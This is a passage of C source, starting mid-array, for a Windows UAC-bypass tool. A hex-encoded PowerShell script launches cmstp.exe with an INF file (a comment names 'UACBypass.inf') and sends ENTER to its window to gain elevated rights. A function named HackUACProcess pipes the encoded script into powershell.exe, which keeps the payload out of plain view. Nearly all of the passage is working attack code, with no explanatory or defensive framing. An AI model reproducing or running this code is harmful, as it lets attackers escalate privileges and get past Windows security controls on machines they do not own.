    0x69, 0x6E, 0x64, 0x69, 0x6E, 0x67, 0x28, 0x29,
    0x5D, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x0D,
    0x0A, 0x20, 0x20, 0x50, 0x61, 0x72, 0x61, 0x6D,
    0x0D, 0x0A, 0x20, 0x20, 0x28, 0x0D, 0x0A, 0x20,
    0x20, 0x20, 0x20, 0x5B, 0x50, 0x61, 0x72, 0x61,
    0x6D, 0x65, 0x74, 0x65, 0x72, 0x28, 0x4D, 0x61,
    0x6E, 0x64, 0x61, 0x74, 0x6F, 0x72, 0x79, 0x20,
    0x3D, 0x20, 0x24, 0x54, 0x72, 0x75, 0x65, 0x2C,
    0x20, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x46, 0x72,
    0x6F, 0x6D, 0x50, 0x69, 0x70, 0x65, 0x6C, 0x69,
    0x6E, 0x65, 0x42, 0x79, 0x50, 0x72, 0x6F, 0x70,
    0x65, 0x72, 0x74, 0x79, 0x4E, 0x61, 0x6D, 0x65,
    0x20, 0x3D, 0x20, 0x24, 0x54, 0x72, 0x75, 0x65,
    0x29, 0x5D, 0x20, 0x5B, 0x73, 0x74, 0x72, 0x69,
    0x6E, 0x67, 0x5D, 0x20, 0x24, 0x50, 0x72, 0x6F,
    0x63, 0x65, 0x73, 0x73, 0x4E, 0x61, 0x6D, 0x65,
    0x0D, 0x0A, 0x20, 0x20, 0x29, 0x0D, 0x0A, 0x20,
    0x20, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,
    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x7B, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x24, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x41,
    0x63, 0x74, 0x69, 0x6F, 0x6E, 0x50, 0x72, 0x65,
    0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65, 0x20,
    0x3D, 0x20, 0x27, 0x53, 0x74, 0x6F, 0x70, 0x27,
    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x54, 0x72, 0x79, 0x20, 0x0D, 0x0A,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x7B, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x24,
    0x68, 0x77, 0x6E, 0x64, 0x20, 0x3D, 0x20, 0x47,
    0x65, 0x74, 0x2D, 0x50, 0x72, 0x6F, 0x63, 0x65,
    0x73, 0x73, 0x20, 0x2D, 0x4E, 0x61, 0x6D, 0x65,
    0x20, 0x24, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
    0x73, 0x4E, 0x61, 0x6D, 0x65, 0x20, 0x7C, 0x20,
    0x53, 0x65, 0x6C, 0x65, 0x63, 0x74, 0x2D, 0x4F,
    0x62, 0x6A, 0x65, 0x63, 0x74, 0x20, 0x2D, 0x45,
    0x78, 0x70, 0x61, 0x6E, 0x64, 0x50, 0x72, 0x6F,
    0x70, 0x65, 0x72, 0x74, 0x79, 0x20, 0x4D, 0x61,
    0x69, 0x6E, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77,
    0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x0D, 0x0A,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x7D, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x43, 0x61, 0x74, 0x63, 0x68,
    0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x7B, 0x0D, 0x0A, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x24, 0x68, 0x77, 0x6E, 0x64, 0x20,
    0x3D, 0x20, 0x24, 0x6E, 0x75, 0x6C, 0x6C, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x7D, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x24, 0x68, 0x61, 0x73,
    0x68, 0x20, 0x3D, 0x20, 0x40, 0x7B, 0x0D, 0x0A,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x4E,
    0x61, 0x6D, 0x65, 0x20, 0x3D, 0x20, 0x24, 0x50,
    0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x4E, 0x61,
    0x6D, 0x65, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x48, 0x77, 0x6E, 0x64,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x3D, 0x20, 0x24, 0x68, 0x77, 0x6E, 0x64, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x7D, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20,
    0x20, 0x20, 0x4E, 0x65, 0x77, 0x2D, 0x4F, 0x62,
    0x6A, 0x65, 0x63, 0x74, 0x20, 0x2D, 0x54, 0x79,
    0x70, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x20, 0x50,
    0x73, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x20,
    0x2D, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74,
    0x79, 0x20, 0x24, 0x68, 0x61, 0x73, 0x68, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x7D, 0x0D, 0x0A,
    0x7D, 0x0D, 0x0A, 0x0D, 0x0A, 0x66, 0x75, 0x6E,
    0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x53, 0x65,
    0x74, 0x2D, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77,
    0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x0D, 0x0A,
    0x7B, 0x0D, 0x0A, 0x20, 0x20, 0x5B, 0x43, 0x6D,
    0x64, 0x6C, 0x65, 0x74, 0x42, 0x69, 0x6E, 0x64,
    0x69, 0x6E, 0x67, 0x28, 0x29, 0x5D, 0x0D, 0x0A,
    0x0D, 0x0A, 0x20, 0x20, 0x50, 0x61, 0x72, 0x61,
    0x6D, 0x0D, 0x0A, 0x20, 0x20, 0x28, 0x0D, 0x0A,
    0x20, 0x20, 0x20, 0x20, 0x5B, 0x50, 0x61, 0x72,
    0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x28, 0x4D,
    0x61, 0x6E, 0x64, 0x61, 0x74, 0x6F, 0x72, 0x79,
    0x20, 0x3D, 0x20, 0x24, 0x54, 0x72, 0x75, 0x65,
    0x2C, 0x20, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x46,
    0x72, 0x6F, 0x6D, 0x50, 0x69, 0x70, 0x65, 0x6C,
    0x69, 0x6E, 0x65, 0x42, 0x79, 0x50, 0x72, 0x6F,
    0x70, 0x65, 0x72, 0x74, 0x79, 0x4E, 0x61, 0x6D,
    0x65, 0x20, 0x3D, 0x20, 0x24, 0x54, 0x72, 0x75,
    0x65, 0x29, 0x5D, 0x20, 0x5B, 0x73, 0x74, 0x72,
    0x69, 0x6E, 0x67, 0x5D, 0x20, 0x24, 0x4E, 0x61,
    0x6D, 0x65, 0x0D, 0x0A, 0x20, 0x20, 0x29, 0x0D,
    0x0A, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x50,
    0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x0D, 0x0A,
    0x20, 0x20, 0x7B, 0x0D, 0x0A, 0x20, 0x20, 0x20,
    0x20, 0x24, 0x6D, 0x65, 0x6D, 0x62, 0x65, 0x72,
    0x44, 0x65, 0x66, 0x69, 0x6E, 0x69, 0x74, 0x69,
    0x6F, 0x6E, 0x20, 0x3D, 0x20, 0x40, 0x27, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x5B, 0x44, 0x6C,
    0x6C, 0x49, 0x6D, 0x70, 0x6F, 0x72, 0x74, 0x28,
    0x22, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E,
    0x64, 0x6C, 0x6C, 0x22, 0x29, 0x5D, 0x20, 0x70,
    0x75, 0x62, 0x6C, 0x69, 0x63, 0x20, 0x73, 0x74,
    0x61, 0x74, 0x69, 0x63, 0x20, 0x65, 0x78, 0x74,
    0x65, 0x72, 0x6E, 0x20, 0x62, 0x6F, 0x6F, 0x6C,
    0x20, 0x53, 0x68, 0x6F, 0x77, 0x57, 0x69, 0x6E,
    0x64, 0x6F, 0x77, 0x28, 0x49, 0x6E, 0x74, 0x50,
    0x74, 0x72, 0x20, 0x68, 0x57, 0x6E, 0x64, 0x2C,
    0x20, 0x69, 0x6E, 0x74, 0x20, 0x6E, 0x43, 0x6D,
    0x64, 0x53, 0x68, 0x6F, 0x77, 0x29, 0x3B, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x5B, 0x44, 0x6C,
    0x6C, 0x49, 0x6D, 0x70, 0x6F, 0x72, 0x74, 0x28,
    0x22, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E,
    0x64, 0x6C, 0x6C, 0x22, 0x2C, 0x20, 0x53, 0x65,
    0x74, 0x4C, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72,
    0x6F, 0x72, 0x20, 0x3D, 0x20, 0x74, 0x72, 0x75,
    0x65, 0x29, 0x5D, 0x20, 0x70, 0x75, 0x62, 0x6C,
    0x69, 0x63, 0x20, 0x73, 0x74, 0x61, 0x74, 0x69,
    0x63, 0x20, 0x65, 0x78, 0x74, 0x65, 0x72, 0x6E,
    0x20, 0x62, 0x6F, 0x6F, 0x6C, 0x20, 0x53, 0x65,
    0x74, 0x46, 0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F,
    0x75, 0x6E, 0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F,
    0x77, 0x28, 0x49, 0x6E, 0x74, 0x50, 0x74, 0x72,
    0x20, 0x68, 0x57, 0x6E, 0x64, 0x29, 0x3B, 0x0D,
    0x0A, 0x0D, 0x0A, 0x27, 0x40, 0x0D, 0x0A, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x41, 0x64, 0x64,
    0x2D, 0x54, 0x79, 0x70, 0x65, 0x20, 0x2D, 0x4D,
    0x65, 0x6D, 0x62, 0x65, 0x72, 0x44, 0x65, 0x66,
    0x69, 0x6E, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x20,
    0x24, 0x6D, 0x65, 0x6D, 0x62, 0x65, 0x72, 0x44,
    0x65, 0x66, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x6F,
    0x6E, 0x20, 0x2D, 0x4E, 0x61, 0x6D, 0x65, 0x20,
    0x41, 0x70, 0x69, 0x20, 0x2D, 0x4E, 0x61, 0x6D,
    0x65, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x55,
    0x73, 0x65, 0x72, 0x33, 0x32, 0x0D, 0x0A, 0x20,
    0x20, 0x20, 0x20, 0x24, 0x68, 0x77, 0x6E, 0x64,
    0x20, 0x3D, 0x20, 0x47, 0x65, 0x74, 0x2D, 0x48,
    0x77, 0x6E, 0x64, 0x20, 0x2D, 0x50, 0x72, 0x6F,
    0x63, 0x65, 0x73, 0x73, 0x4E, 0x61, 0x6D, 0x65,
    0x20, 0x24, 0x4E, 0x61, 0x6D, 0x65, 0x20, 0x7C,
    0x20, 0x53, 0x65, 0x6C, 0x65, 0x63, 0x74, 0x2D,
    0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x20, 0x2D,
    0x45, 0x78, 0x70, 0x61, 0x6E, 0x64, 0x50, 0x72,
    0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x20, 0x48,
    0x77, 0x6E, 0x64, 0x0D, 0x0A, 0x20, 0x20, 0x20,
    0x20, 0x49, 0x66, 0x20, 0x28, 0x24, 0x68, 0x77,
    0x6E, 0x64, 0x29, 0x20, 0x0D, 0x0A, 0x20, 0x20,
    0x20, 0x20, 0x7B, 0x0D, 0x0A, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x24, 0x6F, 0x6E, 0x54, 0x6F,
    0x70, 0x20, 0x3D, 0x20, 0x4E, 0x65, 0x77, 0x2D,
    0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x20, 0x2D,
    0x54, 0x79, 0x70, 0x65, 0x4E, 0x61, 0x6D, 0x65,
    0x20, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E,
    0x49, 0x6E, 0x74, 0x50, 0x74, 0x72, 0x20, 0x2D,
    0x41, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74,
    0x4C, 0x69, 0x73, 0x74, 0x20, 0x28, 0x30, 0x29,
    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x5B, 0x55, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E,
    0x41, 0x70, 0x69, 0x5D, 0x3A, 0x3A, 0x53, 0x65,
    0x74, 0x46, 0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F,
    0x75, 0x6E, 0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F,
    0x77, 0x28, 0x24, 0x68, 0x77, 0x6E, 0x64, 0x29,
    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x5B, 0x55, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E,
    0x41, 0x70, 0x69, 0x5D, 0x3A, 0x3A, 0x53, 0x68,
    0x6F, 0x77, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77,
    0x28, 0x24, 0x68, 0x77, 0x6E, 0x64, 0x2C, 0x20,
    0x35, 0x29, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x7D, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x45,
    0x6C, 0x73, 0x65, 0x20, 0x0D, 0x0A, 0x20, 0x20,
    0x20, 0x20, 0x7B, 0x0D, 0x0A, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x5B, 0x73, 0x74, 0x72, 0x69,
    0x6E, 0x67, 0x5D, 0x20, 0x24, 0x68, 0x77, 0x6E,
    0x64, 0x20, 0x3D, 0x20, 0x27, 0x4E, 0x2F, 0x41,
    0x27, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x7D,
    0x0D, 0x0A, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x24, 0x68, 0x61, 0x73, 0x68, 0x20, 0x3D, 0x20,
    0x40, 0x7B, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
    0x73, 0x20, 0x3D, 0x20, 0x24, 0x4E, 0x61, 0x6D,
    0x65, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x48, 0x77, 0x6E, 0x64, 0x20, 0x20, 0x20,
    0x20, 0x3D, 0x20, 0x24, 0x68, 0x77, 0x6E, 0x64,
    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x7D, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x4E,
    0x65, 0x77, 0x2D, 0x4F, 0x62, 0x6A, 0x65, 0x63,
    0x74, 0x20, 0x2D, 0x54, 0x79, 0x70, 0x65, 0x4E,
    0x61, 0x6D, 0x65, 0x20, 0x50, 0x73, 0x4F, 0x62,
    0x6A, 0x65, 0x63, 0x74, 0x20, 0x2D, 0x50, 0x72,
    0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x20, 0x24,
    0x68, 0x61, 0x73, 0x68, 0x0D, 0x0A, 0x20, 0x20,
    0x7D, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x0D, 0x0A,
    0x23, 0x4E, 0x65, 0x65, 0x64, 0x73, 0x20, 0x57,
    0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x66,
    0x6F, 0x72, 0x6D, 0x73, 0x0D, 0x0A, 0x61, 0x64,
    0x64, 0x2D, 0x74, 0x79, 0x70, 0x65, 0x20, 0x2D,
    0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79,
    0x4E, 0x61, 0x6D, 0x65, 0x20, 0x53, 0x79, 0x73,
    0x74, 0x65, 0x6D, 0x2E, 0x57, 0x69, 0x6E, 0x64,
    0x6F, 0x77, 0x73, 0x2E, 0x46, 0x6F, 0x72, 0x6D,
    0x73, 0x0D, 0x0A, 0x0D, 0x0A, 0x23, 0x43, 0x6F,
    0x6D, 0x6D, 0x61, 0x6E, 0x64, 0x20, 0x74, 0x6F,
    0x20, 0x72, 0x75, 0x6E, 0x0D, 0x0A, 0x24, 0x70,
    0x73, 0x20, 0x3D, 0x20, 0x6E, 0x65, 0x77, 0x2D,
    0x6F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x20, 0x73,
    0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x64, 0x69,
    0x61, 0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63,
    0x73, 0x2E, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73,
    0x73, 0x73, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E,
    0x66, 0x6F, 0x20, 0x22, 0x63, 0x3A, 0x5C, 0x77,
    0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x5C, 0x73,
    0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C,
    0x63, 0x6D, 0x73, 0x74, 0x70, 0x2E, 0x65, 0x78,
    0x65, 0x22, 0x0D, 0x0A, 0x23, 0x24, 0x70, 0x73,
    0x2E, 0x41, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E,
    0x74, 0x73, 0x20, 0x3D, 0x20, 0x22, 0x2F, 0x61,
    0x75, 0x20, 0x63, 0x3A, 0x5C, 0x63, 0x6D, 0x73,
    0x74, 0x70, 0x5C, 0x55, 0x41, 0x43, 0x42, 0x79,
    0x70, 0x61, 0x73, 0x73, 0x2E, 0x69, 0x6E, 0x66,
    0x22, 0x0D, 0x0A, 0x24, 0x70, 0x73, 0x2E, 0x41,
    0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x73,
    0x20, 0x3D, 0x20, 0x22, 0x2F, 0x61, 0x75, 0x20,
    0x24, 0x49, 0x6E, 0x66, 0x46, 0x69, 0x6C, 0x65,
    0x22, 0x0D, 0x0A, 0x24, 0x70, 0x73, 0x2E, 0x55,
    0x73, 0x65, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x45,
    0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x20, 0x3D,
    0x20, 0x24, 0x66, 0x61, 0x6C, 0x73, 0x65, 0x0D,
    0x0A, 0x0D, 0x0A, 0x23, 0x53, 0x74, 0x61, 0x72,
    0x74, 0x20, 0x69, 0x74, 0x0D, 0x0A, 0x5B, 0x73,
    0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x64, 0x69,
    0x61, 0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63,
    0x73, 0x2E, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73,
    0x73, 0x5D, 0x3A, 0x3A, 0x53, 0x74, 0x61, 0x72,
    0x74, 0x28, 0x24, 0x70, 0x73, 0x29, 0x0D, 0x0A,
    0x0D, 0x0A, 0x64, 0x6F, 0x0D, 0x0A, 0x7B, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x23, 0x20, 0x44,
    0x6F, 0x20, 0x6E, 0x6F, 0x74, 0x68, 0x69, 0x6E,
    0x67, 0x20, 0x75, 0x6E, 0x74, 0x69, 0x6C, 0x20,
    0x63, 0x6D, 0x73, 0x74, 0x70, 0x20, 0x69, 0x73,
    0x20, 0x61, 0x6E, 0x20, 0x61, 0x63, 0x74, 0x69,
    0x76, 0x65, 0x20, 0x77, 0x69, 0x6E, 0x64, 0x6F,
    0x77, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x75, 0x6E,
    0x74, 0x69, 0x6C, 0x20, 0x28, 0x28, 0x53, 0x65,
    0x74, 0x2D, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77,
    0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x63,
    0x6D, 0x73, 0x74, 0x70, 0x29, 0x2E, 0x48, 0x77,
    0x6E, 0x64, 0x20, 0x2D, 0x6E, 0x65, 0x20, 0x30,
    0x29, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x23,
    0x41, 0x63, 0x74, 0x69, 0x76, 0x61, 0x74, 0x65,
    0x20, 0x77, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x0D,
    0x0A, 0x53, 0x65, 0x74, 0x2D, 0x57, 0x69, 0x6E,
    0x64, 0x6F, 0x77, 0x41, 0x63, 0x74, 0x69, 0x76,
    0x65, 0x20, 0x63, 0x6D, 0x73, 0x74, 0x70, 0x0D,
    0x0A, 0x0D, 0x0A, 0x23, 0x53, 0x65, 0x6E, 0x64,
    0x20, 0x74, 0x68, 0x65, 0x20, 0x45, 0x6E, 0x74,
    0x65, 0x72, 0x20, 0x6B, 0x65, 0x79, 0x0D, 0x0A,
    0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E,
    0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x2E,
    0x46, 0x6F, 0x72, 0x6D, 0x73, 0x2E, 0x53, 0x65,
    0x6E, 0x64, 0x4B, 0x65, 0x79, 0x73, 0x5D, 0x3A,
    0x3A, 0x53, 0x65, 0x6E, 0x64, 0x57, 0x61, 0x69,
    0x74, 0x28, 0x22, 0x7B, 0x45, 0x4E, 0x54, 0x45,
    0x52, 0x7D, 0x22, 0x29, 0x0D, 0x0A, 0x65, 0x78,
    0x69, 0x74, 0x0D, 0x0A
};



BOOL PipeToInherit(PHANDLE in, PHANDLE out) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    SetHandleInformation(in, HANDLE_FLAG_INHERIT, 0);


    BOOL res = CreatePipe(in, out, &sa, 0);
    DWORD size;
    return res;

}


BOOL HackUACProcess() {

    HANDLE in;
    HANDLE out;

    if (!PipeToInherit(&in, &out)) return 0;



    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD size;
    si.hStdInput = in;
    si.dwFlags = STARTF_USESTDHANDLES;
    TCHAR szCmdline[] = TEXT("powershell.exe");
    CreateProcessW(NULL, szCmdline, NULL, NULL, TRUE, 0, 0, 0, &si, &pi);

    // Wait until child process exits.


    BOOL bSuccess = FALSE;

    PUCHAR tmp = hexData;
    DWORD wSize = 4516;
    WriteFile(out, tmp, wSize, &size, NULL);


    // Close process and thread handles.  
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;
}

